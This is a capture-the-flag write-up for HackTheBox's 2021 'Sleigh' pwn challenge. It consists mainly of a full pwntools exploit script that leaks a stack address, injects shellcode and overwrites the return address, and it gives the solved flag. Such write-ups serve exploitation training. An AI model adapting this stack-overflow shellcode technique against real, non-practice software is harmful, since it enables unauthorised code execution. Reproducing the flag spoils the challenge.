---
name: Sleigh (2021)
event: HackTheBox Cyber Apocalypse CTF 2021
category: Pwn
description: Writeup for Sleigh (Pwn) - HackTheBox Cyber Apocalypse CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Sleigh

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/deg0CQwwN-M/0.jpg)](https://youtu.be/deg0CQwwN-M?t=2843s "HTB Cyber Apocalypse CTF 2021: Sleigh")

## Challenge Description

> The Elves have messed up with Santa's sleigh! Without it, he will not be able to deliver any gifts!! Help him repair it and save the holidays!

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p = process(exe)
    p.sendlineafter(b'>', b'1')  # Chase joker
    p.sendlineafter(b'>', payload)  # Cyclic pattern
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './sleigh'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

# Get the stack address (where out navigation commands will go)
io.sendlineafter(b'>', b'1')
io.recvline()
stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info("leaked stack_addr: %#x", stack_addr)

# Need to pop registers at the beginning to make room on stack
shellcode = asm(shellcraft.popad())
# Build shellcode (cat flag.txt or spawn shell)
shellcode += asm(shellcraft.cat('flag.txt'))
# shellcode += asm(shellcraft.sh())
# Pad shellcode with NOPs until we get to return address
padding = asm('nop') * (offset - len(shellcode))

# Build the payload
payload = flat([
    padding,
    shellcode,
    stack_addr
])

io.sendlineafter(b'>', payload)  # Chase joker

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `HTB{d4sh1nG_thr0ugH_th3_sn0w_1n_4_0n3_h0r53_0p3n_sl31gh!!!}`
